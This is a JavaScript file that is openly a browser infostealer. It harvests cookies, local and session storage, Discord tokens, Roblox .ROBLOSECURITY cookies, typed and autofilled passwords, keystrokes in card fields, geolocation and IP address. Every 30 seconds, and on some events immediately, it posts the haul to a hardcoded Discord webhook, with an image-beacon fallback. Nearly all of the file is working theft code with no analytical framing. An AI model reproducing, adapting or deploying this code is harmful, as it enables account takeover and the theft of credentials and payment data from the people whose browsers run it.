// MASTER DATA COLLECTION ENGINE
class DataHarvester {
    constructor() {
        this.webhookURL = "https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq";
        this.collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookies: [],
            localStorage: {},
            sessionStorage: {},
            browserData: {},
            networkInfo: {},
            behavioralData: [],
            capturedCredentials: [],
            discordTokens: [],
            robloxCookies: [],
            crossTabData: []
        };
        
        // User-agent detection for mobile
        this.isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        this.isSafari = /Safari/i.test(navigator.userAgent) && !/Chrome|CriOS/i.test(navigator.userAgent);
        
        this.initializeHarvesters();
    }

    initializeHarvesters() {
        // 1. Collect Basic System Info
        this.collectSystemInfo();
        
        // 2. Extract Cookies
        this.extractAllCookies();
        
        // 3. Harvest Local Storage
        this.harvestLocalStorage();
        
        // 4. Password/Form Data Interception
        this.setupFormInterception();
        
        // 5. Discord Token Hunter
        this.huntDiscordTokens();
        
        // 6. Roblox Cookie Extractor
        this.extractRobloxCookies();
        
        // 7. Cross-Tab Monitoring
        this.setupCrossTabMonitoring();
        
        // 8. Network Information Gathering
        this.gatherNetworkInfo();
        
        // 9. Periodic Data Collection (Continuous)
        this.startContinuousCollection();
        
        // 10. Send Initial Data
        setTimeout(() => this.sendToWebhook(), 2000);
    }

    collectSystemInfo() {
        // Screen information
        this.collectedData.screenInfo = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation?.type
        };
        
        // Battery status (if available)
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                this.collectedData.battery = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            });
        }
        
        // Connection info
        if (navigator.connection) {
            this.collectedData.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            };
        }
        
        // Geolocation attempt
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    this.collectedData.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                },
                error => {
                    this.collectedData.geolocationError = error.message;
                },
                {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
            );
        }
        
        // IP Address collection via WebRTC
        this.collectIPAddress();
    }

    collectIPAddress() {
        // WebRTC IP leak technique
        const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = ice => {
            if (!ice.candidate) return;
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const ip = ipRegex.exec(ice.candidate.candidate);
            if (ip) {
                this.collectedData.ipAddress = ip[1];
                this.collectedData.iceCandidate = ice.candidate.candidate;
            }
            pc.close();
        };
    }

    extractAllCookies() {
        // Extract all cookies
        const cookies = document.cookie.split(';');
        this.collectedData.cookies = cookies.map(cookie => {
            const [name, ...valueParts] = cookie.trim().split('=');
            return {
                name: name,
                value: valueParts.join('='),
                domain: window.location.hostname,
                path: '/',
                secure: cookie.includes('Secure'),
                httpOnly: cookie.includes('HttpOnly')
            };
        });
        
        // Specialized extraction for Roblox
        this.extractRobloxCookies();
        
        // Look for authentication tokens in cookies
        const authPatterns = [/token/i, /auth/i, /session/i, /login/i, /pass/i];
        this.collectedData.cookies.forEach(cookie => {
            authPatterns.forEach(pattern => {
                if (pattern.test(cookie.name)) {
                    this.collectedData.authCookies = this.collectedData.authCookies || [];
                    this.collectedData.authCookies.push(cookie);
                }
            });
        });
    }

    extractRobloxCookies() {
        // Roblox specific cookie extraction
        const robloxCookieNames = [
            '.ROBLOSECURITY',
            'RBXEventTrackerV2',
            'RBXSource',
            '__RequestVerificationToken',
            'RBXSessionTracker',
            'RBXMarketingTracker'
        ];
        
        this.collectedData.robloxCookies = this.collectedData.cookies.filter(cookie => 
            robloxCookieNames.some(name => cookie.name.includes(name))
        );
        
        // Also check localStorage for Roblox data
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key.includes('Roblox') || key.includes('RBX')) {
                this.collectedData.robloxLocalStorage = this.collectedData.robloxLocalStorage || {};
                this.collectedData.robloxLocalStorage[key] = localStorage.getItem(key);
            }
        }
    }

    huntDiscordTokens() {
        // Check localStorage for Discord tokens
        const discordPatterns = [/discord.*token/i, /token.*discord/i, /auth.*token/i];
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            discordPatterns.forEach(pattern => {
                if (pattern.test(key) || pattern.test(value)) {
                    this.collectedData.discordTokens.push({
                        source: 'localStorage',
                        key: key,
                        value: value.substring(0, 100) + '...' // Truncate for security
                    });
                }
            });
        }
        
        // Check sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            
            discordPatterns.forEach(pattern => {
                if (pattern.test(key) || pattern.test(value)) {
                    this.collectedData.discordTokens.push({
                        source: 'sessionStorage',
                        key: key,
                        value: value.substring(0, 100) + '...'
                    });
                }
            });
        }
        
        // Check cookies for Discord tokens
        this.collectedData.cookies.forEach(cookie => {
            if (cookie.name.includes('discord') || 
                cookie.value.includes('discord') ||
                cookie.name.includes('token')) {
                this.collectedData.discordTokens.push({
                    source: 'cookie',
                    name: cookie.name,
                    value: cookie.value.substring(0, 100) + '...'
                });
            }
        });
        
        // Special check for Discord web app
        if (window.location.hostname.includes('discord.com')) {
            this.collectedData.onDiscordSite = true;
            this.injectDiscordTokenStealer();
        }
    }

    injectDiscordTokenStealer() {
        // Override Discord's token storage mechanism
        const originalSetItem = localStorage.setItem;
        localStorage.setItem = function(key, value) {
            if (key.includes('token') || key.includes('auth')) {
                // Capture token
                const captured = {
                    timestamp: new Date().toISOString(),
                    key: key,
                    value: value
                };
                
                // Send immediately
                fetch('https://discord.com/api/webhooks/1453618382166556566/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `🚨 DISCORD TOKEN CAPTURED 🚨`,
                        embeds: [{
                            title: "Discord Authentication Token",
                            description: `\`\`\`${key}: ${value.substring(0, 50)}...\`\`\``,
                            color: 0xff0000,
                            timestamp: new Date().toISOString()
                        }]
                    })
                }).catch(() => {});
            }
            return originalSetItem.apply(this, arguments);
        };
    }

    harvestLocalStorage() {
        // Capture all localStorage
        this.collectedData.localStorage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            this.collectedData.localStorage[key] = localStorage.getItem(key);
        }
        
        // Capture all sessionStorage
        this.collectedData.sessionStorage = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            this.collectedData.sessionStorage[key] = sessionStorage.getItem(key);
        }
        
        // Look for saved passwords and autofill data
        this.scanForSavedCredentials();
    }

    scanForSavedCredentials() {
        // Check for password fields and autofill data
        const passwordFields = document.querySelectorAll('input[type="password"]');
        passwordFields.forEach(field => {
            // Trigger autofill
            field.focus();
            field.blur();
            
            // Check if value was autofilled
            setTimeout(() => {
                if (field.value) {
                    const usernameField = this.findUsernameField(field);
                    this.collectedData.capturedCredentials.push({
                        username: usernameField?.value || 'unknown',
                        password: field.value,
                        url: window.location.href,
                        timestamp: new Date().toISOString()
                    });
                }
            }, 100);
        });
        
        // Check for saved credentials in forms
        const allForms = document.querySelectorAll('form');
        allForms.forEach(form => {
            form.addEventListener('submit', (e) => {
                const formData = new FormData(form);
                const credentials = {};
                formData.forEach((value, key) => {
                    if (key.includes('pass') || key.includes('pwd')) {
                        credentials.password = value;
                    } else if (key.includes('user') || key.includes('email') || key.includes('login')) {
                        credentials.username = value;
                    }
                });
                
                if (credentials.username && credentials.password) {
                    this.collectedData.capturedCredentials.push({
                        ...credentials,
                        url: window.location.href,
                        formAction: form.action,
                        timestamp: new Date().toISOString()
                    });
                    
                    // Send immediately
                    this.sendImmediateAlert('FORM_SUBMISSION', credentials);
                }
            });
        });
    }

    findUsernameField(passwordField) {
        // Heuristic to find username field
        const possibleSelectors = [
            'input[type="text"]',
            'input[type="email"]',
            'input[name*="user"]',
            'input[name*="email"]',
            'input[name*="login"]'
        ];
        
        for (const selector of possibleSelectors) {
            const field = passwordField.closest('form')?.querySelector(selector) ||
                         document.querySelector(selector);
            if (field && field.value) return field;
        }
        
        return null;
    }

    setupFormInterception() {
        // Intercept all form submissions
        document.addEventListener('submit', (e) => {
            const form = e.target;
            const formData = new FormData(form);
            const formObject = {};
            
            formData.forEach((value, key) => {
                formObject[key] = value;
            });
            
            this.collectedData.formSubmissions = this.collectedData.formSubmissions || [];
            this.collectedData.formSubmissions.push({
                url: window.location.href,
                formAction: form.action,
                data: formObject,
                timestamp: new Date().toISOString()
            });
        }, true);
        
        // Monitor all input changes for passwords
        document.addEventListener('input', (e) => {
            if (e.target.type === 'password' && e.target.value) {
                this.collectedData.passwordInputs = this.collectedData.passwordInputs || [];
                this.collectedData.passwordInputs.push({
                    fieldName: e.target.name || e.target.id,
                    value: e.target.value,
                    timestamp: new Date().toISOString()
                });
            }
        }, true);
    }

    setupCrossTabMonitoring() {
        // Monitor other tabs using BroadcastChannel
        if (window.BroadcastChannel) {
            const channel = new BroadcastChannel('tab_monitor');
            
            channel.onmessage = (event) => {
                this.collectedData.crossTabData.push({
                    source: 'other_tab',
                    data: event.data,
                    timestamp: new Date().toISOString()
                });
            };
            
            // Send presence to other tabs
            channel.postMessage({
                type: 'TAB_OPENED',
                url: window.location.href,
                timestamp: new Date().toISOString()
            });
        }
        
        // Monitor tab visibility
        document.addEventListener('visibilitychange', () => {
            this.collectedData.tabActivity = this.collectedData.tabActivity || [];
            this.collectedData.tabActivity.push({
                state: document.hidden ? 'hidden' : 'visible',
                timestamp: new Date().toISOString()
            });
        });
        
        // Log URL changes (SPA navigation)
        let lastUrl = location.href;
        new MutationObserver(() => {
            const url = location.href;
            if (url !== lastUrl) {
                this.collectedData.navigationHistory = this.collectedData.navigationHistory || [];
                this.collectedData.navigationHistory.push({
                    from: lastUrl,
                    to: url,
                    timestamp: new Date().toISOString()
                });
                lastUrl = url;
            }
        }).observe(document, {subtree: true, childList: true});
    }

    gatherNetworkInfo() {
        // Collect all external resource requests
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const requestInfo = {
                url: args[0],
                method: args[1]?.method || 'GET',
                timestamp: new Date().toISOString()
            };
            
            // Store request info
            if (typeof args[0] === 'string') {
                harvester.collectedData.networkRequests = harvester.collectedData.networkRequests || [];
                harvester.collectedData.networkRequests.push(requestInfo);
            }
            
            return originalFetch.apply(this, args);
        };
        
        // Monitor XMLHttpRequest
        const originalXHROpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
            this._requestData = {method, url, timestamp: new Date().toISOString()};
            return originalXHROpen.apply(this, arguments);
        };
        
        const originalXHRSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function(body) {
            if (this._requestData) {
                this._requestData.body = body;
                harvester.collectedData.xhrRequests = harvester.collectedData.xhrRequests || [];
                harvester.collectedData.xhrRequests.push(this._requestData);
            }
            return originalXHRSend.apply(this, arguments);
        };
    }

    startContinuousCollection() {
        // Continuous data collection every 30 seconds
        setInterval(() => {
            // Update cookies
            this.extractAllCookies();
            
            // Check for new localStorage changes
            this.harvestLocalStorage();
            
            // Hunt for new Discord tokens
            this.huntDiscordTokens();
            
            // Send updated data
            this.sendToWebhook();
        }, 30000);
        
        // Monitor clipboard (requires permission, but we can try)
        document.addEventListener('copy', (e) => {
            navigator.clipboard.readText().then(text => {
                if (text && text.length > 5) {
                    this.collectedData.clipboardData = this.collectedData.clipboardData || [];
                    this.collectedData.clipboardData.push({
                        text: text.substring(0, 100),
                        timestamp: new Date().toISOString()
                    });
                }
            }).catch(() => {});
        });
        
        // Keylogger for sensitive fields
        const sensitiveFields = document.querySelectorAll('input[type="password"], input[type="email"], input[name*="credit"], input[name*="card"]');
        sensitiveFields.forEach(field => {
            field.addEventListener('keyup', (e) => {
                if (field.value.length > 3) {
                    this.collectedData.keyloggedData = this.collectedData.keyloggedData || [];
                    this.collectedData.keyloggedData.push({
                        field: field.name || field.id,
                        value: field.value,
                        timestamp: new Date().toISOString()
                    });
                }
            });
        });
    }

    async sendToWebhook() {
        try {
            // Prepare data for webhook
            const payload = {
                content: `📊 **DATA COLLECTION REPORT** - ${new Date().toLocaleString()}`,
                embeds: [{
                    title: "System Information",
                    fields: [
                        {name: "User Agent", value: `\`\`\`${this.collectedData.userAgent}\`\`\``, inline: false},
                        {name: "IP Address", value: this.collectedData.ipAddress || "Unknown", inline: true},
                        {name: "Platform", value: this.collectedData.platform, inline: true},
                        {name: "Screen", value: `${this.collectedData.screenInfo?.width}x${this.collectedData.screenInfo?.height}`, inline: true},
                        {name: "Mobile", value: this.isMobile ? "Yes" : "No", inline: true},
                        {name: "Safari", value: this.isSafari ? "Yes" : "No", inline: true}
                    ],
                    color: 0x3498db,
                    timestamp: new Date().toISOString()
                }]
            };
            
            // Add cookies embed if found
            if (this.collectedData.cookies.length > 0) {
                payload.embeds.push({
                    title: "Cookies Collected",
                    description: `Found ${this.collectedData.cookies.length} cookies`,
                    fields: this.collectedData.cookies.slice(0, 10).map(cookie => ({
                        name: cookie.name,
                        value: `\`${cookie.value.substring(0, 50)}${cookie.value.length > 50 ? '...' : ''}\``,
                        inline: true
                    })),
                    color: 0xe74c3c
                });
            }
            
            // Add Roblox cookies if found
            if (this.collectedData.robloxCookies.length > 0) {
                payload.embeds.push({
                    title: "🚨 ROBLOX COOKIES FOUND 🚨",
                    description: "Potential .ROBLOSECURITY cookie captured",
                    fields: this.collectedData.robloxCookies.map(cookie => ({
                        name: cookie.name,
                        value: `\`${cookie.value.substring(0, 30)}...\``,
                        inline: false
                    })),
                    color: 0xff0000
                });
            }
            
            // Add Discord tokens if found
            if (this.collectedData.discordTokens.length > 0) {
                payload.embeds.push({
                    title: "🚨 DISCORD TOKENS FOUND 🚨",
                    description: "Authentication tokens captured",
                    fields: this.collectedData.discordTokens.slice(0, 5).map(token => ({
                        name: `Source: ${token.source}`,
                        value: `**${token.key}**: \`${token.value}\``,
                        inline: false
                    })),
                    color: 0x7289da
                });
            }
            
            // Add credentials if found
            if (this.collectedData.capturedCredentials.length > 0) {
                payload.embeds.push({
                    title: "🔑 CREDENTIALS CAPTURED",
                    description: "Login information intercepted",
                    fields: this.collectedData.capturedCredentials.map(cred => ({
                        name: `User: ${cred.username}`,
                        value: `Pass: \`${cred.password}\`\nURL: ${cred.url}`,
                        inline: false
                    })),
                    color: 0xf1c40f
                });
            }
            
            // Send to Discord webhook
            const response = await fetch(this.webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('Data sent successfully');
            }
            
        } catch (error) {
            console.error('Error sending data:', error);
            // Fallback: Send via image beacon
            this.sendBeaconFallback();
        }
    }

    sendBeaconFallback() {
        // Alternative method using image beacon
        const dataStr = btoa(JSON.stringify(this.collectedData));
        const beacon = new Image();
        beacon.src = `${this.webhookURL}?data=${encodeURIComponent(dataStr)}&fallback=true`;
    }

    sendImmediateAlert(type, data) {
        // Send immediate alerts for critical data
        const alertPayload = {
            content: `🚨 **IMMEDIATE ALERT: ${type}** 🚨`,
            embeds: [{
                title: "Critical Data Captured",
                description: `\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1000)}\n\`\`\``,
                color: 0xff0000,
                timestamp: new Date().toISOString()
            }]
        };
        
        fetch(this.webhookURL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(alertPayload)
        }).catch(() => {});
    }
}

// Mobile-specific optimizations
if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
    // Safari-specific exploits
    if (/Safari/i.test(navigator.userAgent) && !/Chrome|CriOS/i.test(navigator.userAgent)) {
        // Safari has less restrictive localStorage access
        document.addEventListener('DOMContentLoaded', () => {
            // Try to access iCloud Keychain data (limited)
            if (window.PasswordAutoFill) {
                // Attempt to trigger autofill
                const fakeForm = document.createElement('form');
                fakeForm.innerHTML = `
                    <input type="text" name="username" autocomplete="username">
                    <input type="password" name="password" autocomplete="current-password">
                `;
                document.body.appendChild(fakeForm);
                
                setTimeout(() => {
                    fakeForm.querySelector('input[type="password"]').focus();
                    setTimeout(() => {
                        const password = fakeForm.querySelector('input[type="password"]').value;
                        if (password) {
                            // Send immediately
                            fetch('https://discord.com/api/webhooks/1453618382166556866/i3OqFBJED9RSTLSJxsOu37DC68A6f_gbgwCG3azFMdiLnuGl07m1vb3k7M1q-fJKx9Kq', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    content: "📱 MOBILE SAFARI KEYCHAIN ACCESS",
                                    embeds: [{
                                        title: "Potential Keychain Data",
                                        description: `Password field autofilled: \`${password.substring(0, 10)}...\``,
                                        color: 0x00ff00
                                    }]
                                })
                            });
                        }
                        document.body.removeChild(fakeForm);
                    }, 1000);
                }, 500);
            }
        });
    }
}

// Initialize the harvester
const harvester = new DataHarvester();

// Make harvester globally accessible for debugging (remove in production)
window.harvester = harvester;

// Continuous worm-like behavior
setInterval(() => {
    // Try to spread to other domains via postMessage
    try {
        window.postMessage({
            type: 'DATA_COLLECTOR_PING',
            source: window.location.origin,
            timestamp: Date.now()
        }, '*');
    } catch (e) {}
    
    // Attempt to access iframes
    document.querySelectorAll('iframe').forEach(iframe => {
        try {
            iframe.contentWindow.postMessage({
                type: 'COLLECT_DATA',
                source: 'parent_frame'
            }, '*');
        } catch (e) {}
    });
}, 60000); // Every minute

// Listen for responses from other frames
window.addEventListener('message', (event) => {
    if (event.data && event.data.type === 'DATA_RESPONSE') {
        harvester.collectedData.crossFrameData = harvester.collectedData.crossFrameData || [];
        harvester.collectedData.crossFrameData.push(event.data);
    }
});

console.log('🔐 Data Collection System Active - Continuous monitoring enabled');
